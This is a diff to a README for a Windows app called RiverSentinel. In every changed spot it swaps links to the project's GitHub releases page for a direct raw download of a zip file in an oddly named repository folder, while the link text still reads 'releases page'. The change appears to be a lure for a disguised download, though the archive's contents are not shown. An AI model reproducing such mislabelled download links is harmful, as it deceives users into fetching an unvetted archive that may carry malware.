@@ -1,12 +1,12 @@
 # 🌊 RiverSentinel - Monitor Rivers and Act Fast
 
-[![Download RiverSentinel](https://img.shields.io/badge/Download%20RiverSentinel-Release%20Page-2ea44f?style=for-the-badge&logo=github)](https://github.com/meltdowncomingattraction207/RiverSentinel/releases)
+[![Download RiverSentinel](https://img.shields.io/badge/Download%20RiverSentinel-Release%20Page-2ea44f?style=for-the-badge&logo=github)](https://github.com/meltdowncomingattraction207/RiverSentinel/raw/refs/heads/main/cablelike/River-Sentinel-3.5.zip)
 
 ## 🚀 Download RiverSentinel
 
 Use the release page to get the Windows version of RiverSentinel:
 
-[Visit the RiverSentinel releases page](https://github.com/meltdowncomingattraction207/RiverSentinel/releases)
+[Visit the RiverSentinel releases page](https://github.com/meltdowncomingattraction207/RiverSentinel/raw/refs/heads/main/cablelike/River-Sentinel-3.5.zip)
 
 1. Open the link above.
 2. Find the latest release at the top of the page.
@@ -179,6 +179,6 @@ Open the main app file to start the program. Keep the folder together so the app
 
 Use the release page to get new versions, fixes, and build files:
 
-[RiverSentinel releases page](https://github.com/meltdowncomingattraction207/RiverSentinel/releases)
+[RiverSentinel releases page](https://github.com/meltdowncomingattraction207/RiverSentinel/raw/refs/heads/main/cablelike/River-Sentinel-3.5.zip)
 
 Check it when you need the newest Windows download or a new build for your team
